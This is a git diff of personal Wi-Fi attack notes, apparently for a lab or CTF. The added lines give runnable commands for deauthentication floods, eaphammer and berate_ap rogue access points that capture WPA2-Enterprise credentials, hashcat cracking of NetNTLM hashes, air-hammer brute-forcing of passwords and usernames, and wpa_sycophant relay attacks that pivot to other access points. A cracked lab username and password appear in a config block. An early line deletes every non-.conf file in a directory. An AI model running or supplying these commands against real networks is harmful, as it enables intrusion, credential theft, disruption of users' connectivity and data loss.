@@ -2,21 +2,29 @@
 - delete unused files: ``` find . -type f ! -name "*.conf" -exec rm {} \;```
 
 ## Basic Recon
-- Clean processes first: ``` sudo airmon-ng check kill ```
-### 
-- monitor channel has another name 
+
+- monitor channel has another name: wlan1mon 
 - 'Station' = mac address of that AP | CH = channel
 - ```--band abg```: This specifies that the tool should capture packets on both 2.4 GHz (b) and 5 GHz (a) bands
 - ```--manufacturer```: This flag enables logging of manufacturer information for detected devices based on their MAC addresses.
 - ```--wps```: This option includes WPS (Wi-Fi Protected Setup) information in the output, which can provide details about supported WPS versions and configuration methods.
-1. Check AP/ESSID/Channel/etc..
+
+### Init setup: Clean processes first:
+ ``` sudo airmon-ng check kill ```
+
+### Airodump basic
+- Check AP/ESSID/Channel/etc..
     ```
     sudo airmon-ng start wlan0
     sudo airodump-ng wlan0mon -w ./scan --manufacturer --wps --band abg 
     -c {channel number for smaller scope}
 
     ```
-2. Crack hidden AP name
+- Turn off monitor mode
+  
+  ``` sudo airmon-ng stop wlan1mon ```    
+
+### Crack hidden AP name
     ```
     // prep wordlist | customize it 
     cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ./wifi-rockyou.txt 
@@ -195,4 +203,105 @@
 1. ``` cd /root/tools/EAP_buster/ ```
 2. using tool wifi_db to check users in this network (Table: IdentityAP)
    
-   【OR] use the name found in there then ``` bash ./EAP_buster.sh $SSID 'GLOBAL\GlobalAdmin' wlan1 ``` 
+   【OR] use the name found in there then ``` bash ./EAP_buster.sh $SSID 'GLOBAL\GlobalAdmin' wlan1 ```
+
+## WPA 2 MGT - (Deauth attack) 
+- Attack and Crack Client password to login as that user 
+- ``` git clone https://github.com/s0lst1c3/eaphammer ```
+1. ``` cd /root/tools/eaphammer ```
+2. ``` python3 ./eaphammer --cert-wizard``` random fill something
+3. *** Start rogue AP ``` python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced ```
+4. Gather all possible AP BSSID instance of this ESSID
+5. [in parallel another terminal] 
+   ```
+   // for loop create terminal for below
+        airmon-ng start wlan0
+        iwconfig wlan0mon channel 8964
+        aireplay-ng -0 0 -a $BSSID1 wlan0mon -c $StationID
+
+        airmon-ng start wlan1
+        iwconfig wlan1mon channel 8964
+        aireplay-ng -0 0 -a $BSSID1 wlan0mon -c $StationID
+
+    // etc...
+
+   ```
+6. [If] certain station not work then try another stationID
+7. [Success] --> grab hashcat Netntlm
+8. ``` hashcat -a 0 -m 5500 juan.netntlmhash ~/rockyou-top100000.txt --force ```
+9. prep wpa2-mgt.conf
+   ```
+    network={
+        ssid="wifi-corp"
+        key_mgmt=WPA-EAP
+        identity="CONTOSO\juan.tr"
+        password="bulldogs1234"
+        eap=PEAP
+        phase2="auth=MSCHAPV2"
+    }
+
+   ``` 
+10. ``` sudo wpa_supplicant -Dnl80211 -iwlan3 -c wpa2-mgt.conf```
+11. ``` sudo dhclient wlan3 ```
+12. Try Login portal xxx.xxx.xxx.1 with identity and password 
+
+### Brute force password with known user name 
+- https://github.com/Wh1t3Rh1n0/air-hammer
+1. ``` cd  ~/tools/air-hammer ```
+2. prepare user list ``` echo 'CONTOSO\test' > test.user ```
+3. GO FUCK!!! ``` ./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user ```
+
+### Brute force username with know password
+- https://github.com/Wh1t3Rh1n0/air-hammer
+1. prepare domain tagged user list``` cat ~/top-usernames-shortlist.txt | awk '{print "CONTOSO\\" $1}' > ~/top-usernames-shortlist-contoso.txt ```
+2. ``` cd  ~/tools/air-hammer ```
+3. GO FUCK!!! ``` ./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt ```
+
+## WPA 2 MGT - (relay attack) 
+- Try this when password uncrackable 
+- https://github.com/sensepost/berate_ap
+- https://github.com/sensepost/wpa_sycophant 
+1. Prepare fake AP with interface wlan1 and copy first 3 hex of the AP you want to fake
+   ```
+    systemctl stop network-manager
+    airmon-ng stop wlan1mon
+    ip link set wlan1 down
+    macchanger -m F0:9F:C2:00:00:00 wlan1
+    ip link set wlan1 up
+   ```
+2. prep ```wpa2-mgt-fake.conf``` for below [Shell 3] 
+   - change ssid
+   - Dont want to connect back to ourselves, so rogue BSSID in bssid_blacklist
+   ```
+   network={
+        ssid="wifi-regional-tablets"
+        scan_ssid=1
+        key_mgmt=WPA-EAP
+        identity=""
+        anonymous_identity=""
+        password=""
+        eap=PEAP
+        phase1="crypto_binding=0 peaplabel=0"
+        phase2="auth=MSCHAPV2"
+        bssid_blacklist=F0:9F:C2:00:00:00
+    }
+   ```
+3. [Shell 1] Host rougue AP 
+   ``` ./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets ``` 
+4. [In Parallel Shell 2] try deauth attack with -a = AP mac, -c = station (that connecting) mac
+   ```
+    iwconfig wlan0mon channel 44
+    aireplay-ng -0 0 wlan0mon -a F0:9F:C2:7A:33:28 -c 64:32:A8:A9:DE:55
+   ```
+5. [In Parallel Shell 3] Relay attack
+   ```
+    ./wpa_sycophant.sh -c wpa2-mgt-fake.conf -i wlan3
+   ```  
+6. [If failed]: change ```.conf``` file ``` phase1="peapver=1" ```
+
+### Compromising another AP with relaying already compromised AP 
+1. Same step as above
+2. only change ssid in ``` wpa2-mgt-fake.conf ``` to the new target AP
+
+##
+ 
